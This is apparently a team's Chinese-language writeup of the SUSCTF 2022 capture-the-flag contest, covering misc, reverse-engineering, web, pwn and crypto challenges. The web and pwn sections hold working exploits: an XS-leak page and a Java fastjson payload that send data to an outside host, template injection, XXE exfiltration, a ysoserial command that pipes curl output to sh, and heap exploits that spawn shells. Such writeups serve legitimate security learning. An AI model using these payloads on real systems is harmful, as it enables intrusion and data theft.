# SUSCTF Writeup by X1cT34m

![image-20220303111732834](https://gitee.com/leonsec/images/raw/master/image-202203031117328_.png)

![image-20220303112224332](https://gitee.com/leonsec/images/raw/master/image-20220303112224332_.png)

## Misc

### Audio
题目给了两个音频文件，其中一个是origin音频文件，于是想到flag应该被bgm的声音盖住了，要用origin音频把bgm给去掉。
把两个文件都拖进Audacity里进行分析,参照`https://www.bilibili.com/video/BV1Es411o78z/`这个教程把bgm给去掉。去掉bgm后听到了滴滴的声音，是摩斯电码！把每一块摩斯电码抠出来，参照电码表译出即可。
![](https://gitee.com/leonsec/images/raw/master/upload_4ff839e2531a9c8be01ef63e386746cb.png)
![](https://gitee.com/leonsec/images/raw/master/upload_deac2dc53483c01264d4361f3e3b989a.png)
flag为==SUSCTF{MASTEROFAUDIO}==

### checkin

向机器人发送 `>flag` 然后截图
==SUSCTF{0oooOh!you_cAtched_the_Flag_wh1ch_1s_not_ez_to_r3m3mb3r}==

### ra2
红警2

下个.Net 5.0 SDK，然后`make all`, `./lauch-game.cmd`启动游戏

有一个mission：Fighting for Flag，打赢就能拿flag

搜全局，找到了配置文件： Romanovs-Vengeance/mods/rv/maps/ctf-01/ctf-01.lua

改大初始金额、增大怪物生成时间、缩短晚上时间后，游戏难度几乎为0

打掉3个Mayan Platform后，会让我们去一个ancient地方找flag，跑遍一下地图，然后找到了一块广告牌

![](https://gitee.com/leonsec/images/raw/master/upload_f521976dccc2d77fe41e766c63243a35.png)

![](https://gitee.com/leonsec/images/raw/master/upload_6b01e90594f9947337b5e2541046ad49_.png)

![](https://gitee.com/leonsec/images/raw/master/upload_3f50fb55a8aae8a62689e81d60c4fc5b_.png)

![](https://gitee.com/leonsec/images/raw/master/upload_c11538c4c0c143a0ab2453cfa0b77229_.png)

SUSCTF{RED_ALERT_WINNER!!!}

## Reverse

### DigitalCircuits

逻辑门实现的 tea 套一下脚本

```python
import libnum


def decrypt(v,key):
    v0 = v[0]
    v1 = v[1]
    sum = 0xC6EF3720
    detal = 0x9e3779b9
    for i in range(0,32):
        v1 |= 0x100000000
        v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3])
        v1 &= 0xffffffff
        v0 |= 0x100000000
        v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1])
        v0 &= 0xffffffff
        sum |= 0x100000000
        sum -= detal
        sum &= 0xffffffff
    print(str(libnum.n2s(v0), encoding="utf-8"),end="")
    print(str(libnum.n2s(v1), encoding="utf-8"),end="")


if __name__ == "__main__":
    # key 初始化
    key = [17477, 16708, 16965, 17734]
    # 从程序中 dump 出的数据
    a = [0x3e8947cb, 0xcc944639, 0x31358388, 0x3b0b6893, 0xda627361, 0x3b2e6427]
    for i in range(0, 24, 8):
        decrypt(a[i//4:], key)
# SUSCTF{XBvfaEdQvbcrxPBh8AOcJ6gA}
```

### hell_world

和西湖论剑 gghdl 基本相同，不同的是每次 xor 数据不同，调试一下，拿出 xor 数据就可以

```python
arr = [5,143,158,121,42,192,104,129,45,252,207,164,181,85,95,228,157,35,214,29,241,231,151,145,6,36,66,113,60,88,92,48,25,198,245,188,75,66,93,218,88,155,36,64]
arr = [129,45,252,207,164,181,85,95,228,157,35,214,29,241,231,151,145,6,36,66,113,60,88,92,48,25,198,245,188,75,66,93,218,88,155,36]
xor = [181, 29, 157, 252, 151, 140, 49, 107, 201, 251, 26, 226, 45, 220, 211, 241, 244, 54, 9, 32, 66, 4, 106, 113, 83, 120, 164, 151, 143, 122, 114, 57, 232, 61, 250, 64]
for i in range(0, 36):
    print(chr(arr[i] ^ xor[i]), end = "")
# SUSCTF{40a339d4-f940-4fe0-b382-cabb310d2ead}
```

## WEB


### fxxkcors

json csrf

```html
<form action="http://124.71.205.122:10002/changeapi.php" method="POST" id="form" enctype="text/plain">
    <input name='{"username":"byc404", "test":"' value='test"}'>
</form>
<script>form.submit()</script>
```

### ez_note

history.length xsleak

bot停的时间太短一次只能判断一个字符了

```html
<!doctype html>
<html>
<body>
  <script>

    let flag = "a"
    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }
    const chars = "CTF0123456789abcdefghijklmnopqrstuvwxyz_{}";
    async function check(char) {
      win  = window.open("http://123.60.29.171:10001")
      win.location = "http://123.60.29.171:10001/search?q=SUSCTF{"+ char
      await sleep(1600)
      win.location = "about:blank"
      await sleep(100)
      win.history.go(-1)
      win.location = "about:blank";
      return win.history.length
    }

    async function main() {
      for (let ch of chars) {
        let res = await check(flag + ch)
        if (res) {
          fetch("http://VPS_IP/?flag="+ ch, {mode: "no-cors"})
          flag+= ch;
          break;
        }
      }
    }


   async function test() {
        ch="a"
        let res = await check(flag + ch)
        fetch("http://VPS_IP/?flag="+ ch + "-"+res, {mode: "no-cors"})
   }
    //main();
     test();
  </script>
  <iframe src="https://deelay.me/999999/http://example.com"></iframe>
</body>
</html>
```


### HTML practice

经测试以及黑名单结合判断应该是mako 模板引擎。
读了下语法，可以通过循环语句做到代码执行以及assign。
然后用unicode绕黑名单。

最后差一个传字符串的方法。看了下 Mako Runtime 可以用`context.kwargs.get("name")`来获取到渲染时的可控name参数。然后`context.write`把结果写到output去

```
%for a in context.kwargs.keys():
    %for c in ᵉval(context.kwargs.get(a)):
        %for h in (context.write(c), 2):
            byc_404
        %endfor
    %endfor
% endfor
```

`http://124.71.178.252/view/yCDTjeqStl3NgHcxVIbX5J7s8hkvaP10.html?name=__import__(%27os%27).popen(%27cat%20/flag%27).read()`

### baby gadget v1.0
admin/admin123弱密码进后台
发现下载lib，存在fastjson1.2.48
直接使用{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"ldap://xxx.xxx.xxx.xxx/Exploit"}
直接正常打ldap，发现命令执行有问题，选择用java带出flag

```java=
import java.io.*;
import java.net.*;
import java.util.*;

public class Exploit{
    public Exploit() throws Exception {
        FileReader fr = new FileReader("/flag");
        BufferedReader br = new BufferedReader(fr);

        String str = br.readLine();
        sendGet("http://xxx.xxx.xxx.xxx:xxx/",str);

    }
    public static String sendGet(String url, String param) {
        String result = "";
        BufferedReader in = null;
        try {
            String urlNameString = url + "?" + param;
            URL realUrl = new URL(urlNameString);

            URLConnection connection = realUrl.openConnection();
            connection.setRequestProperty("accept", "*/*");
            connection.setRequestProperty("connection", "Keep-Alive");
            connection.setRequestProperty("user-agent",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");

            connection.connect();

            Map<String, List<String>> map = connection.getHeaderFields();

            for (String key : map.keySet()) {
                System.out.println(key + "--->" + map.get(key));
            }

            in = new BufferedReader(new InputStreamReader(
                    connection.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result += line;
            }
        } catch (Exception e) {
            System.out.println("asd" + e);
            e.printStackTrace();
        }
        
        finally {
            try {
                if (in != null) {
                    in.close();
                }
            } catch (Exception e2) {
                e2.printStackTrace();
            }
        }
        return result;
    }

    public static void main(String[] args) throws Exception {
    }
}
```
### baby gadget v1.0's rrrevenge
同1的打法

### baby gadget v2.0
登陆处有xxe，提示读取hint，有waf，通过utf-16be绕，长度也有限制，用服务器外带
```
<?xml version="1.0" encoding="UTF-16" ?>
<!DOCTYPE users[
<!ENTITY % file SYSTEM "file:///hint.txt">
<!ENTITY % remote SYSTEM "http://xxx.xxx.xxx:xxx/a.dtd">
%remote;
%all;
]>

<user><number>aaa</number><name>&send;</name></user>
```
hint提示文件名，访问下载获得源码，ban了一些常用类的commons-collections反序列化。
想到强网杯的有个题，这没有ban JRMP ，所以直接通过JRMP打反序列化rce即可
`java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 23334 CommonsCollections5 "curl http://xxx.xxx.xxx:xxx/aa|sh"`
`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient xxx.xxx.xxx.xxx:xxx`
### baby gadget v2.0' revenge
同1做法


## Pwn
### rain
```python
from pwn import *
context.log_level="debug"
#r=process('./main')
r=remote('124.71.185.75',9999)

libc=ELF("./libc.so.6")

rand_file=open("./rand_list","rw")
rand_list=rand_file.read()
rand_list=rand_list.split("\n")
for i in range (len(rand_list)-1): rand_list[i]=int(rand_list[i],16)
for i in range (0x400): rand_list.append(0)
idx=0

def sen(heigh,width,front,back,rainfall,content=''):
	r.sendlineafter('ch> ','1')
	payload=p32(heigh)+p32(width)+p8(front)+p8(back)+p32(rainfall)
	payload=payload.ljust(18,'a')
	payload+=content
	r.sendafter('FRAME> ',payload)
	global idx
	if (content!=""): idx=idx+heigh*width

def create(content,total_len,strlen):
	payload_len=len(content)
	payload=[]
	for i in range(total_len):
		payload.append("a")
	global idx
	for i in range(payload_len):
		payload[rand_list[idx]%(strlen)]=content[i]
		idx=idx+1
	payload="".join(payload)
	return payload


sen(1,1,0,0,1,'a'*0x8)
sen(1,1,0,0,1,'')
sen(1,1,0,0,1,'')
r.sendlineafter('ch> ','2')

sen(1,0,0,0,1,p64(0x603080))
r.sendlineafter('ch> ','2')

r.recvuntil("Table:"+' '*0xC)
heap=u64(r.recvuntil('\n',drop=True).ljust(0x8,'\x00'))-0x8fa0
success("heap: "+hex(heap))

sen(1,1,0,0,1,'c'*0x100+p64(heap+0x90e8)+p64(heap+0x290))
sen(1,1,0,0,1,'a'*0x8)
sen(1,1,0,0,1,'')
sen(1,1,0,0,1,'')

sen(0,1,0,0,1,p64(heap+0x90e0))
sen(1,0x3,0,0,1,create("\x18\x2F\x60",0x58,0x5b))

sen(0x4,0x19,0,0,1,'\x00'*0x18)
r.sendlineafter('ch> ','2')

libc_base=u64(r.recvuntil("\x7f")[-6:]+p16(0))-libc.sym['putchar']
success("libc_base: "+hex(libc_base))

realloc_hook=libc_base+libc.sym["__realloc_hook"]
system=libc_base+libc.sym["system"]
one_gadget=libc_base+0x10a468

size=0x38

sen(0x4,0x19,0,0,1,'e'*0x100+p64(heap+0x9628)+p64(realloc_hook-size+0x6))
sen(0x4,0x19,0,0,1,'e'*size)
sen(0x4,0x19,0,0,1,'')
sen(0x4,0x19,0,0,1,'')

sen(size//0x8,0x20,0,0,1,p64(heap+0x9628)+"a"*(size-0x8))

rand_list[idx+0]=51
rand_list[idx+1]=0x785c8788
rand_list[idx+2]=0x1f3e66a2
rand_list[idx+3]=0x1a2dac75
rand_list[idx+4]=0x2779d0cc
rand_list[idx+5]=0x678d03df

payload=create(p64(system)[:6],size,size+1)
sen(0x4,size,0,0,1,"/bin/sh;"+payload[8:])

#gdb.attach(r)
sen(1,1,0,0,1,'')

r.interactive()


```
### happytree
程序主要实现了一个二叉排序树的结点加入和删除，其中每个结点的左子树中结点的值都小于它，右子树中所有结点的值都大于它，且没有重复的结点（每个结点的值`&0xff`就是`malloc`的堆块`size`），开始感觉删除那里当需要删除的结点左右都存在子结点的时候可能有漏洞可以利用，后来也没细想，因为发现了更简单的利用思路，可以构造一个只有左结点的单边树，然后将结点依次删除，填满`tcache`后，再删除一个使其进入`unsorted bin`，而每次删除的时候，存放结点信息的堆块也会跟着被删除，此时，在`unsorted bin`中的结点对应的存放信息的堆块就进入了`fastbin`，这个存放信息的堆块的`fd`自然是`0`，而这个`fd`的位置，就是之前存放结点对应值的位置，又因为存放信息的堆块的`bk`不会更改，会有数据残留，仍然是对应结点的堆块地址，且包括存放该结点左右子结点地址的位置也不会被覆盖，都存在数据残留，利用这几个数据残留就很容易达到`UAF`的目的。具体操作就是，从`tcache`末端申请回一个结点堆块及其对应存放信息的堆块，此时其对应存放信息的堆块的左节点位置就是在`unsorted bin`中的结点所对应的存放信息的堆块（在`fastbin`中），此时这个存放信息的堆块存放的结点的值为`0`（由于`0`是最小的值，因此之前要构建只有左结点的单边树，而不能是右节点），存放的对应结点位置就是在`unsorted bin`中的堆块地址，若是我们`show(0)`，自然就可以泄露出`libc`的基地址了，然后我们再申请一个小一些的`size`，就会从`unsorted bin`分割出一部分给用户，这样我们`0`这个值所对应的结点堆块地址和申请的小一些的`size`对应的结点堆块地址就指向了同一个地址，又因为这是在`libc-2.27(1.2)`下的，故可以直接`double free`进`tcache`中，也就可以任意写了。
```python
from pwn import *
context(os = "linux", arch = "amd64", log_level = "debug")

#io = process("./pwn")
io = remote("124.71.147.225", 9999)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

def insert(size, content = b'\n'):
	io.sendlineafter("cmd> ", b'1')
	io.sendlineafter("data: ", str(size))
	io.sendafter("content: ", content)

def delete(size):
	io.sendlineafter("cmd> ", b'2')
	io.sendlineafter("data: ", str(size))

def show(size):
	io.sendlineafter("cmd> ", b'3')
	io.sendlineafter("data: ", str(size))

def quit():
	io.sendlineafter("cmd> ", b'4')

insert(0x1000)
for i in range(9):
	insert(0x100*(9-i)+0xff)
for i in range(8):
	delete(0x100*(9-i)+0xff)
insert(0xff)
show(0)
io.recvuntil("content: ")
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 96
success("libc_base:\t" + hex(libc_base))
insert(0x160)
delete(0)
delete(0x160)
insert(0x260, p64(libc_base + libc.sym['__free_hook'] - 8))
insert(0x360)
insert(0x460, b'/bin/sh\x00' + p64(libc_base + libc.sym['system']))
delete(0x460)
io.interactive()
```

### mujs
```javascript
// heapSpray
for(i = 0; i < 0x80; i +=1)
	DataView(0x48)

front = DataView(0xFF8);
last = DataView(0x48);
front = DataView(0x48);
P = DataView(0x48);
target = DataView(0x48);

front.setUint8(0x48 + 8, 10);
Date.prototype.setTime.bind(P)(1332403882588) // set Length overflow
front.setUint8(0x48 + 8, 16); // recover

PIE_low = P.getUint32(0x58) - 0x470A0;
print(PIE_low.toString(16));

P.setUint32(0xC8,PIE_low + 0x472A0)

LIBC_low = target.getUint32(0) - 0x1EC6A0
LIBC_high = target.getUint32(4)
print(LIBC_low.toString(16));

P.setUint32(0xC8,LIBC_low + 0x1EEB28 - 8)
P.setUint32(0xCC,LIBC_high)


target.setUint32(0x8,LIBC_low + 0x55410)
target.setUint32(0xC,LIBC_high)

P.setUint32(0xA0,0x6E69622F)
P.setUint32(0xA4,0x0068732F)
```

### kernel
两个题都是根目录权限配置问题
```bash
chmod 777 . ..
mv bin BIN
/BIN/mkdir bin
/BIN/chmod 777 bin
/BIN/echo "/BIN/cat /flag" >/bin/umount
/BIN/chmod 777 /bin/umount
exit
```
## Crypto
### InverseProblem
题目名字是反问题，一开始被名字带偏了，还去找了矩阵反问题，找到了病态矩阵求解的一些知识，用一些相关正规化方法也调不出结果。后来想了想，这题就因为python浮点数的精度是52位，所以方程组很敏感，给它每个数都扩大的话，敏感的那部分误差就相当于error，那就直接用LWE或者CVP去解就行了。
这里就通过Embedded Technique的构造，把CVP转化成SVP，然后规约之后解方程就可以了。
```python
import numpy as np
f=open('b.txt','r')
b=[]
for line in f:
    tmp = line[:-5].replace('.','')
    b.append(int(tmp))

def gravity(n,d=0.25):
    A=np.zeros([n,n])
    for i in range(n):
        for j in range(n):
            A[i,j]=d/n*(d**2+((i-j)/n)**2)**(-1.5)
    return A

A = gravity(85)
A = [[int(j*10^18) for j in i] for i in A]

M = []
for i in range(85):
    M.append(A[i] + [0])

M.append(b + [1])
M = Matrix(ZZ, M)
ans = M.LLL()[0]
flag=M.solve_left(ans)
print(bytes(flag[:-1]))
```

### large case

这道题在已知 $p,q,r$ 的情况下我们可以很快地求出 $\phi(n)$ 。由于 $e$ 不知道，且已知 $e$ 与 $\phi(n)$ 不互素，因此我们可以通过先分解 $p-1,q-1,r-1$ 。根据费马小定理，我们可以求出 $e=757×66553×5156273$ 。给出以 $p$ 为例求指数的代码

```python
fp = [2, 7, 757, 1709, 85015583 , 339028665499, 149105250954771885483776047]
for i in fp:
    if pow(c,(p-1)//i,p)==1:
        print(i)
#757
```

考虑到 $r$ 对应的 $e$ 是 $500$ 多万比较大，因此我们可以先只考虑 $c$ 模 $pq$ 的情况。由于 $c\equiv m^{757×66553×5156273} \pmod n$ ，因此 $c\equiv m^{757×66553×5156273} \pmod {pq}$ 。这一步可以利用求逆元的方法直接开 $5156273$ 次方得到唯一的 $c_0$ 模 $pq$ 的值。

然后可以使用AMM算法（直接使用现成的模板），计算出 $m^{757} \mod q$ 共 $66553$ 个可能值和 $m^{66553} \pmod p$ 共$757$个值。进而可以直接求逆元，得到 $m\mod p$ 和 $m \mod q$ 的值。再使用CRT进行两两组合。

```python
from os import urandom
from Crypto.Util.number import *
TejieP=...#AMM算法直接套模板求出特解
TejieQ=...#AMM算法直接套模板求出特解
p=...
q=...
r=...
c=...
e=757*66553*5156273
n=p*q*r
def dicvalue(ele,dic):
    try:
        return dic[ele]
    except:
        return 0
DicP,DicQ={},{}
TongjieP,TongjieQ=[],[]
ep,eq=757,66553
print("Finding Tongjie P")
while len(TongjieP)<757:
    x=bytes_to_long(urandom(80))
    a=pow(x,(p-1)//757,p)
    if dicvalue(a,DicP)==0:
        TongjieP.append(a)
        DicP[a]=1
        print(f"len:{len(TongjieP)}/757")
print("Finding Tongjie Q")
while len(TongjieQ)<66553:
    x=bytes_to_long(urandom(80))
    a=pow(x,(q-1)//66553,q)
    if dicvalue(a,DicQ)==0:
        TongjieQ.append(a)
        DicQ[a]=1
        print(f"len:{len(TongjieQ)}/66553")
print("Processing Tongjie P")
for i in range(757):
    if i % 200 == 0:
        print(f"len:{i}/757")
    TongjieP[i]=(TongjieP[i]*TejieP)%p
    TongjieP[i]=pow(TongjieP[i],inverse(66553,(p-1)),p)
print("Processing Tongjie Q")
for i in range(66553):
    if i % 200 == 0:
        print(f"len:{i}/66553")
    TongjieQ[i]=(TongjieQ[i]*TejieQ)%q
    TongjieQ[i]=pow(TongjieQ[i],inverse(757,(q-1)),q)
C=[]
print("Starting CRT")
for i in range(len(TongjieP)):
    for j in range(len(TongjieQ)):
        tim=i*66553+j
        if(tim%50000==0):
            print(f"Numbers:{tim}/{50380621}")
        dm=crt([int(TongjieP[i]), int(TongjieQ[i])], [p, q])
        if b'SUSCTF' in long_to_bytes(dm):
            print(long_to_bytes(dm))
            break
```



